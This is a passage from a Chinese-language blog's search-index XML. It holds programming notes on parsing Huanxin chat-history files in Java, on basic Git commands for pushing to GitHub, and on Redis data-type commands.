&#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;解压完成&quot;</span>);</span><br><span class="line">            <span class="comment">//解析json字符串文件，ouputfile为文件路径</span></span><br><span class="line">            getHistoryMessages(ouputfile);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex)&#123;</span><br><span class="line">            System.out.println(ex.toString());</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (gzin != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    gzin.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (fout != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    fout.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (fin != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    fin.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将解压后的文件内容转换为字符串(json格式字符串)，并解析json字符串</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getHistoryMessages</span><span class="params">(String fileName)</span></span>&#123;</span><br><span class="line">        InputStream inputStream = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            inputStream = <span class="keyword">new</span> FileInputStream(fileName);</span><br><span class="line">            String msg = getStreamToStr(inputStream);</span><br><span class="line">            System.out.println(<span class="string">&quot;解压后的消息字符串：&quot;</span>+msg);</span><br><span class="line">            <span class="comment">//字符串替换</span></span><br><span class="line">            String str1 = msg.replace(<span class="string">&quot;&#123;\&quot;chat_type\&quot;&quot;</span>,<span class="string">&quot; &#123;\&quot;chat_type\&quot;&quot;</span>);</span><br><span class="line">            <span class="comment">//去除前后两端的空格</span></span><br><span class="line">            String str2 = str1.trim();</span><br><span class="line">            <span class="comment">//字符串分割</span></span><br><span class="line">            String[] strings = str2.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="comment">//将json格式字符串转化为对象</span></span><br><span class="line">            List&lt;ChatMessageHistory&gt; chatMessageHistoryList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; strings.length; i++) &#123;</span><br><span class="line">                ChatMessageHistory chatMessageHistory = JSON.parseObject(strings[i],ChatMessageHistory.class);</span><br><span class="line">                chatMessageHistoryList.add(chatMessageHistory);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; chatMessageHistoryList.size(); i++) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;第&quot;</span>+(i+<span class="number">1</span>)+<span class="string">&quot;条消息：&quot;</span>+chatMessageHistoryList.get(i).getPayload().getBodies().get(<span class="number">0</span>).getMsg());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//关闭字节输入流</span></span><br><span class="line">            <span class="keyword">if</span> (inputStream != <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    inputStream.close();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将一个字节输入流转化为字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> tInputStream</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getStreamToStr</span><span class="params">(InputStream tInputStream)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (tInputStream != <span class="keyword">null</span>) &#123;</span><br><span class="line">            InputStreamReader inputStreamReader = <span class="keyword">null</span>;</span><br><span class="line">            BufferedReader tBufferedReader = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//将字节输入流转换为字符输入流</span></span><br><span class="line">                inputStreamReader = <span class="keyword">new</span> InputStreamReader(tInputStream);</span><br><span class="line">                <span class="comment">//赋予字符流对象缓冲区</span></span><br><span class="line">                tBufferedReader = <span class="keyword">new</span> BufferedReader(inputStreamReader);</span><br><span class="line">                StringBuffer tStringBuffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">                String sTempOneLine;</span><br><span class="line">                <span class="keyword">while</span> ((sTempOneLine = tBufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    tStringBuffer.append(sTempOneLine);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> tStringBuffer.toString();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">                ex.printStackTrace();</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (inputStreamReader != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        inputStreamReader.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (tBufferedReader != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        tBufferedReader.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>（<strong>注意：</strong>#{Orgname}、#{Appname}、#{token}是变量，替换成自己的即可）</p><p>（<strong>注意：</strong>InputStream字节输入流是不能复用的，具体知识自行百度补充）</p>]]></content>
      
      
      <categories>
          
          <category> 环信集成 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 环信集成 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git的基本使用</title>
      <link href="2021/04/21/Git%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>2021/04/21/Git%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Git的基本使用"><a href="#Git的基本使用" class="headerlink" title="Git的基本使用"></a>Git的基本使用</h1><h2 id="Git基本信息设置"><a href="#Git基本信息设置" class="headerlink" title="Git基本信息设置"></a>Git基本信息设置</h2><ol><li><p>设置用户名</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&#x27;填写自己的GitHub用户名&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><ol><li><p>设置用户邮箱</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.email <span class="string">&#x27;填写自己的邮箱&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="Git本地仓库提交代码到GitHub远程仓库"><a href="#Git本地仓库提交代码到GitHub远程仓库" class="headerlink" title="Git本地仓库提交代码到GitHub远程仓库"></a>Git本地仓库提交代码到GitHub远程仓库</h2><ol><li><p>初始化Git本地仓库（在项目文件夹内使用git init命令初始化git仓库，会自动生成一个.git文件夹）</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure></li></ol><ol><li><p>将初始化后的本地git仓库与GitHub上的远程仓库进行关联，关联后可将本地仓库代码提交到远程仓库进行版本管理(SSH地址关联，需要先设置SSH秘钥)</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote add origin git@github.com:[自己的GitHub用户名]/[GitHub上创建的仓库名].git</span><br></pre></td></tr></table></figure></li></ol><ol><li><p>查看本地仓库的状态，查看本地仓库有没有文件（不是查看文件夹里是否有文件）</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure></li></ol><ol><li><p>切换提交的分支</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -b master <span class="comment"># 切换到master分支，</span></span><br><span class="line"><span class="comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span></span><br><span class="line"><span class="comment"># 如果不是，后面的所有设置的分支记得保持一致</span></span><br></pre></td></tr></table></figure></li></ol><ol><li><p>提交文件到缓存区</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add 要提交的文件名 <span class="comment">#如果要提交仓库中所有的文件，则使用 git add .</span></span><br></pre></td></tr></table></figure></li></ol><ol><li><p>将缓存区的文件提交到本地仓库</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git commit -m <span class="string">&quot;提交时的描述，比如此次提交做了什么修改等&quot;</span></span><br></pre></td></tr></table></figure></li></ol><ol><li><p>将提交到本地仓库的文件项目提交到关联的GitHub远程仓库</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin main</span><br></pre></td></tr></table></figure></li></ol><ol><li><p>如果提交远程仓库时报错，远程仓库和本地仓库有冲突时，先合并仓库在提交</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git pull --rebase origin main</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis基础命令</title>
      <link href="2021/03/17/redis%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>2021/03/17/redis%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="Redis数据存储格式："><a href="#Redis数据存储格式：" class="headerlink" title="Redis数据存储格式："></a>Redis数据存储格式：</h3><div class="note blue no-icon flat"><p>Redis自身是一个Map，其中所有的数据都是采用key：value的形式存储。</p></div><h3 id="Redis常用命令："><a href="#Redis常用命令：" class="headerlink" title="Redis常用命令："></a>Redis常用命令：</h3><div class="table-container"><table><thead><tr><th style="text-align:center">功能</th><th style="text-align:center">命令</th><th style="text-align:center">范例</th></tr></thead><tbody><tr><td style="text-align:center">设置数据</td><td style="text-align:center">set key value</td><td style="text-align:center">set name Tom</td></tr><tr><td style="text-align:center">获取数据</td><td style="text-align:center">get key</td><td style="text-align:center">get name</td></tr><tr><td style="text-align:center">清屏</td><td style="text-align:center">clear</td><td style="text-align:center">clear</td></tr><tr><td style="text-align:center">获取帮助</td><td style="text-align:center">help</td><td style="text-align:center">help</td></tr><tr><td style="text-align:center">退出</td><td style="text-align:center">quit/exit</td><td style="text-align:center">quit/exit</td></tr></tbody></table></div><h3 id="Redis数据类型-5种-："><a href="#Redis数据类型-5种-：" class="headerlink" title="Redis数据类型(5种)："></a>Redis数据类型(5种)：</h3><h4 id="string类型数据的基础操作："><a href="#string类型数据的基础操作：" class="headerlink" title="string类型数据的基础操作："></a>string类型数据的基础操作：</h4><ul><li><strong>添加/修改数据</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">单个数据</th><th style="text-align:center">多个数据</th></tr></thead><tbody><tr><td style="text-align:center">set key value</td><td style="text-align:center">mset key1 value1 key2 value2 …</td></tr></tbody></table></div><ul><li><strong>获取数据</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">单个数据</th><th style="text-align:center">多个数据</th></tr></thead><tbody><tr><td style="text-align:center">get key</td><td style="text-align:center">mget key1 key2 …</td></tr></tbody></table></div><ul><li><strong>删除数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">del key</span><br></pre></td></tr></table></figure><ul><li><strong>获取数据字符个数（字符串长度）</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strlen key</span><br></pre></td></tr></table></figure><ul><li><strong>追加信息到原始信息后部（如果原始信息存在就追加，否则新建）</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">append key value</span><br></pre></td></tr></table></figure><h4 id="string类型数据的扩展操作："><a href="#string类型数据的扩展操作：" class="headerlink" title="string类型数据的扩展操作："></a>string类型数据的扩展操作：</h4><h5 id="数据库分表场景："><a href="#数据库分表场景：" class="headerlink" title="数据库分表场景："></a>数据库分表场景：</h5><ul><li><strong>设置数值数据增加指定范围的值</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">范例(num初始值为”1”)</th><th style="text-align:center">结果</th></tr></thead><tbody><tr><td style="text-align:center">incr key</td><td style="text-align:center">incr num</td><td style="text-align:center">num=”2”</td></tr><tr><td style="text-align:center">incrby key increment</td><td style="text-align:center">incrby num 10</td><td style="text-align:center">num=”12”</td></tr><tr><td style="text-align:center">incrbyfloat key increment</td><td style="text-align:center">incrbyfloat num 1.5</td><td style="text-align:center">num=”13.5”</td></tr></tbody></table></div><ul><li><strong>设置数值数据减少指定范围的值</strong></li></ul><div class="table-container"><table><thead><tr><th>命令</th><th>范例(num初始值为”15”)</th><th>结果</th></tr></thead><tbody><tr><td>decr key</td><td>decr num</td><td>num=”14”</td></tr><tr><td>decrby key increment</td><td>decrby num 10</td><td>num=”4”</td></tr></tbody></table></div><div class="note green no-icon flat"><ul><li>string在Redis内部存储默认是一个字符串，当遇到增减类操作incr、decr时会转成数值类型进行计算。</li><li>Redis所有的操作都是原子性的，采用单线程处理所有业务，命令是一个一个执行的，因此无需考虑并发带来的数据影响。</li><li>注意：按数值进行操作的数据，如果原始数据不能转成数值，或超越了Redis数值上限范围将报错。9223372036854775807（java中Long型数据最大值，Long.MAX_VALUE）</li></ul><h6 id="tips："><a href="#tips：" class="headerlink" title="tips："></a>tips：</h6><ul><li>Redis用于控制数据库表主键id，为数据库表主键提供生成策略，保障数据库表的主键唯一性。</li><li>此方案适用于所有数据库，且支持数据库集群。</li></ul></div><h5 id="设置数据生命周期："><a href="#设置数据生命周期：" class="headerlink" title="设置数据生命周期："></a>设置数据生命周期：</h5><ul><li><strong>设置数据具有制定的生命周期</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">范例</th><th style="text-align:center">结果</th></tr></thead><tbody><tr><td style="text-align:center">setex key seconds value</td><td style="text-align:center">setex  num 10 Tom</td><td style="text-align:center">10秒后数据消失</td></tr><tr><td style="text-align:center">psetex key milliseconds value</td><td style="text-align:center">psetex num 1000 Tom</td><td style="text-align:center">1000毫秒后数据消失</td></tr></tbody></table></div><h6 id="tips："><a href="#tips：" class="headerlink" title="tips："></a>tips：</h6><ul><li>Redis控制数据的生命周期，通过数据是否失效控制业务行为，适用于所有具有时效性限定控制的操作。</li></ul><h5 id="string类型数据操作的注意事项："><a href="#string类型数据操作的注意事项：" class="headerlink" title="string类型数据操作的注意事项："></a>string类型数据操作的注意事项：</h5><p>数据操作不成功的反馈与数据正常操作之间的差异</p><p>①表示运行结果是否成功</p><ul><li><p>（integer）0 —&gt; false 失败</p></li><li><p>（integer）1 —&gt; true 成功</p></li></ul><p>②表示运行结果</p><ul><li><p>（integer）3 —&gt; 3 3个</p></li><li><p>（integer）1 —&gt; 1 1个</p></li><li><p>数据未获取到</p><p>（nil）等同于null</p></li><li><p>数据最大存储量</p><p>512MB</p></li><li><p>数值计算最大范围(java中long的最大值)</p><p>±9223372036854775807</p></li></ul><h5 id="key的设置约定"><a href="#key的设置约定" class="headerlink" title="key的设置约定"></a>key的设置约定</h5><p>表名 ：主键名 ：主键值 ： 字段名</p><hr><h4 id="hash类型数据的基础操作："><a href="#hash类型数据的基础操作：" class="headerlink" title="hash类型数据的基础操作："></a>hash类型数据的基础操作：</h4><ul><li><strong>添加/修改数据</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">单个数据操作</th><th style="text-align:center">多个数据操作</th></tr></thead><tbody><tr><td style="text-align:center">hset key field value</td><td style="text-align:center">hmset key field1 value1 field2 value2…</td></tr></tbody></table></div><ul><li><strong>获取数据</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">单个数据操作</th><th style="text-align:center">多个数据操作</th></tr></thead><tbody><tr><td style="text-align:center">hget key field</td><td style="text-align:center">hmget key field1 field2 …</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">hgetall key</td></tr></tbody></table></div><ul><li><strong>删除数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hdel key field1 [field2]</span><br></pre></td></tr></table></figure><ul><li><strong>获取哈希表中字段的数量</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hlen key</span><br></pre></td></tr></table></figure><ul><li><strong>获取哈希表中是否存在指定的字段</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexists key field</span><br></pre></td></tr></table></figure><h4 id="hash类型数据扩展操作"><a href="#hash类型数据扩展操作" class="headerlink" title="hash类型数据扩展操作"></a>hash类型数据扩展操作</h4><ul><li>获取哈希表中所有的字段名或字段值</li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th></th></tr></thead><tbody><tr><td style="text-align:center">hkeys key</td><td></td></tr><tr><td style="text-align:center">hvals key</td></tr></tbody></table></div><ul><li><strong>设置指定字段的数值数据增加指定范围的值</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th></th></tr></thead><tbody><tr><td style="text-align:center">hincrby key field increment</td><td></td></tr><tr><td style="text-align:center">hincrbyfloat key field increment</td></tr></tbody></table></div><h5 id="hash类型数据操作注意事项"><a href="#hash类型数据操作注意事项" class="headerlink" title="hash类型数据操作注意事项"></a>hash类型数据操作注意事项</h5><ul><li><p>hash类型下的value只能存储字符串，不允许存储其他数据类型，不存在嵌套现象。如果未获取到数据，对应值为(nil)</p></li><li><p>每个hash可以存储2^32-1</p></li><li><p>hash类型十分贴近对象的数据存储形式，并且可以灵活添加删除对象属性。但hash设计初衷不是为了存储大量对象而设计的，切记不可滥用，更不可将hash作为对象列表使用。</p></li><li><p>hgetall操作可以获取全部属性，如果内部field过多，遍历整体数据效率就会很低，有可能成为数据访问瓶颈。</p><h4 id="hash类型应用场景"><a href="#hash类型应用场景" class="headerlink" title="hash类型应用场景"></a>hash类型应用场景</h4><h5 id="购物车订单场景"><a href="#购物车订单场景" class="headerlink" title="购物车订单场景"></a>购物车订单场景</h5><p>以客户id作为key，每位客户创建一个hash存储结构对象。</p><p>将商品编号作为field，购买数量作为value进行存储。</p><p>设一个新的key,将所有商品基本信息独立存储在一个hash。</p><p>将商品编号作为field，商品信息的json数据作为value进行存储。</p><p>添加商品：追加全新的field与value</p><p>浏览：遍历hash</p><p>更改数据：自增/自减，设置value值</p><p>删除商品：删除field</p><p>清空：删除key</p></li></ul><ul><li><p><strong>如果当前对应的key中的field有值就什么都不做，如果没有值就添加</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hsetnx key field value</span><br></pre></td></tr></table></figure><hr></li></ul><h4 id="list类型数据的基础操作："><a href="#list类型数据的基础操作：" class="headerlink" title="list类型数据的基础操作："></a>list类型数据的基础操作：</h4><p>数据存储需求：存储多个数据，并对数据进入存储空间的顺序进行区分。</p><p>需要的存储结构：一个存储空间保存多个数据，且通过数据可以提现进入顺序。</p><p>list类型：保存多个数据，底层使用双向链表存储结构实现。</p><ul><li><p><strong>添加/修改数据</strong></p><p>|             命令             |<br>| :—————————————: |<br>| lpush key value1 [value2] …… |<br>| rpush key value1 [value2] …… |</p></li></ul><ul><li><strong>获取数据</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th></tr></thead><tbody><tr><td style="text-align:center">lrange key start stop</td></tr><tr><td style="text-align:center">lindex key index</td></tr><tr><td style="text-align:center">llen key</td></tr></tbody></table></div><ul><li><strong>获取并移除数据</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th></tr></thead><tbody><tr><td style="text-align:center">lpop key</td></tr><tr><td style="text-align:center">rpop key</td></tr></tbody></table></div><h4 id="list类型数据扩展操作"><a href="#list类型数据扩展操作" class="headerlink" title="list类型数据扩展操作"></a>list类型数据扩展操作</h4><ul><li><strong>规定时间内获取并移除数据</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th></tr></thead><tbody><tr><td style="text-align:center">blpop key1 [key2] timeout</td></tr><tr><td style="text-align:center">brpop key1 [key2] timeout</td></tr></tbody></table></div><ul><li><strong>移除指定数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lrem key count value</span><br></pre></td></tr></table></figure><hr><h4 id="set类型数据的基础操作："><a href="#set类型数据的基础操作：" class="headerlink" title="set类型数据的基础操作："></a>set类型数据的基础操作：</h4><ul><li><strong>添加数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sadd key member1 [member2]</span><br></pre></td></tr></table></figure><ul><li><strong>获取全部数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smembers key</span><br></pre></td></tr></table></figure><ul><li><strong>删除数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">srem key member1 [member2]</span><br></pre></td></tr></table></figure><ul><li><strong>获取集合数据总量</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scard key</span><br></pre></td></tr></table></figure><ul><li><strong>判断集合中是否包含指定数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sismember key member</span><br></pre></td></tr></table></figure><h4 id="set类型数据的扩展操作"><a href="#set类型数据的扩展操作" class="headerlink" title="set类型数据的扩展操作"></a>set类型数据的扩展操作</h4><h5 id="根据用户兴趣爱好推荐场景（操作随机数据）"><a href="#根据用户兴趣爱好推荐场景（操作随机数据）" class="headerlink" title="根据用户兴趣爱好推荐场景（操作随机数据）"></a>根据用户兴趣爱好推荐场景（操作随机数据）</h5><ul><li><strong>随机获取集合中指定数量的数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">srandmember key [count]</span><br></pre></td></tr></table></figure><ul><li><strong>随机获取集合中的某个数据并将该数据移出集合</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">spop key</span><br></pre></td></tr></table></figure><h5 id="set数据交并差操作"><a href="#set数据交并差操作" class="headerlink" title="set数据交并差操作"></a>set数据交并差操作</h5><ul><li><strong>求两个集合的交、并、差集</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">操作名称</th><th style="text-align:center">命令</th></tr></thead><tbody><tr><td style="text-align:center">交集</td><td style="text-align:center">sinter key1 [key2]</td></tr><tr><td style="text-align:center">并集</td><td style="text-align:center">sunion key1 [key2]</td></tr><tr><td style="text-align:center">差集</td><td style="text-align:center">sdiff key1 [key2]</td></tr></tbody></table></div><ul><li><strong>求两个集合的交、并、差集并存储到指定集合中</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">操作名称</th><th style="text-align:center">命令</th><th style="text-align:center">范例</th></tr></thead><tbody><tr><td style="text-align:center">key1与key2的交集存储到destination指定的集合中</td><td style="text-align:center">sinterstore destination key1 [key2]</td><td style="text-align:center">sinterstore u3 u1 u2</td></tr><tr><td style="text-align:center">key1与key2的并集存储到destination指定的集合中</td><td style="text-align:center">sunionstore destination key1 [key2]</td><td style="text-align:center">sunionstore u3 u1 u2</td></tr><tr><td style="text-align:center">key1与key2的差集存储到destination指定的集合中</td><td style="text-align:center">sdiffstore destination key1 [key2]</td><td style="text-align:center">sdiffstore u3 u1 u2</td></tr></tbody></table></div><ul><li><strong>将指定数据从原始集合中移动到目标集合中</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smove source destination  member</span><br></pre></td></tr></table></figure><ul><li><strong>Tips:</strong><ul><li>redis 应用于同类信息的关联搜索，二度关联搜索，深度关联搜索。</li><li>显示共同关注（一度）</li><li>显示共同好友（一度）</li><li>由用户A出发，获取到好友用户B的好友信息列表（一度）</li><li>由用户A出发，获取到好友用户B的购物清单列表（二度）</li><li>由用户A出发，获取到好友用户B的游戏充值列表（二度）</li></ul></li></ul><h5 id="set类型数据操作的注意事项"><a href="#set类型数据操作的注意事项" class="headerlink" title="set类型数据操作的注意事项"></a>set类型数据操作的注意事项</h5><ul><li><p>set类型不允许数据重复，如果添加的数据在set中已经存在，将只保留一份</p></li><li><p>set虽然与hash的存储结构相同，但是无法启用hash中存储值的空间</p></li></ul><hr><h4 id="sorted-set类型数据的基础操作："><a href="#sorted-set类型数据的基础操作：" class="headerlink" title="sorted_set类型数据的基础操作："></a>sorted_set类型数据的基础操作：</h4><p>新的存储需求：数据排序有利于数据的有效展示，需要提供一种可以根据自身特征进行排序的方式</p><p>需要的存储结构：新的存储模型，可以保存可排序的数据</p><p>sorted_set类型：在set的存储结构基础上添加可排序字段</p><ul><li><strong>添加数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zadd key score1 member1 [score2 member2]</span><br></pre></td></tr></table></figure><ul><li><strong>获取全部数据</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">获取顺序</th></tr></thead><tbody><tr><td style="text-align:center">zrange key start stop [WITHSCORES]</td><td style="text-align:center">升序</td></tr><tr><td style="text-align:center">zrevrange key start stop [WITHSCORES]</td><td style="text-align:center">降序</td></tr></tbody></table></div><ul><li><strong>删除数据</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zrem key member [member ...]</span><br></pre></td></tr></table></figure><ul><li><strong>按条件获取数据</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">获取顺序</th><th style="text-align:center">范例</th></tr></thead><tbody><tr><td style="text-align:center">zrangebyscore key min max [WITHSCORES] [LIMIT]</td><td style="text-align:center">升序</td><td style="text-align:center">zrangebyscore u1 50 80 withscores 或zrangebyscore u1 50 80 limit 0 3 withscores</td></tr><tr><td style="text-align:center">zrevrangebyscore key max min [WITHSCORES]</td><td style="text-align:center">降序</td><td style="text-align:center">zrevrangebyscore u1 80 50 withscores</td></tr></tbody></table></div><ul><li><strong>按条件删除数据</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">范例</th><th style="text-align:center">删除方式</th></tr></thead><tbody><tr><td style="text-align:center">zremrangebyrank key start stop</td><td style="text-align:center">zremrangebyrank u1 0 1</td><td style="text-align:center">按索引删除</td></tr><tr><td style="text-align:center">zremrangebyscore key min max</td><td style="text-align:center">zremrangebyscore u1 50 80</td><td style="text-align:center">按score删除</td></tr></tbody></table></div><p>注意：</p><p>min与max用于限定搜索查询条件</p><p>start与stop用于限定查询范围，作用与索引，表示开始和结束的索引</p><p>offset与count用于限定查询范围，作用与查询结果，表示开始位置和数据总量</p><ul><li><strong>获取集合数据总量</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th></tr></thead><tbody><tr><td style="text-align:center">zcard key</td></tr><tr><td style="text-align:center">zcount key min max</td></tr></tbody></table></div><ul><li><strong>集合交、并操作</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th></tr></thead><tbody><tr><td style="text-align:center">zinterstore destination numkeys key [key …]</td></tr><tr><td style="text-align:center">zunionstore destination numkeys key [key …]</td></tr></tbody></table></div><h4 id="sorted-set类型数据的扩展操作"><a href="#sorted-set类型数据的扩展操作" class="headerlink" title="sorted_set类型数据的扩展操作"></a>sorted_set类型数据的扩展操作</h4><ul><li><strong>获取数据对应的索引（排名）</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th></tr></thead><tbody><tr><td style="text-align:center">zrank key member</td></tr><tr><td style="text-align:center">zrevrank key member</td></tr></tbody></table></div><ul><li><strong>score值获取与修改</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">操作名称</th></tr></thead><tbody><tr><td style="text-align:center">zscore key member</td><td style="text-align:center">获取</td></tr><tr><td style="text-align:center">zincrby key increment member</td><td style="text-align:center">修改</td></tr></tbody></table></div><ul><li><strong>获取当前系统时间</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">结果</th></tr></thead><tbody><tr><td style="text-align:center">time</td><td style="text-align:center">1）“1569575565”  2) “434277”</td></tr></tbody></table></div><h5 id="sorted-set类型数据操作的注意事项"><a href="#sorted-set类型数据操作的注意事项" class="headerlink" title="sorted_set类型数据操作的注意事项"></a>sorted_set类型数据操作的注意事项</h5><ul><li><p>score保存的数据存储空间是64位，如果 是整数范围是-9007199254740992~9007199254740992</p></li><li><p>score保存的数据也可以是一个双精度的double值，基于双精度浮点数的特征，可能会丢失精度，使用时要慎重</p></li><li><p>sorted_set底层存储还是基于set结构，因此数据不能重复，如果重复添加相同数据，score值将被反复覆盖，保留最后一次修改结果</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单列设计模式</title>
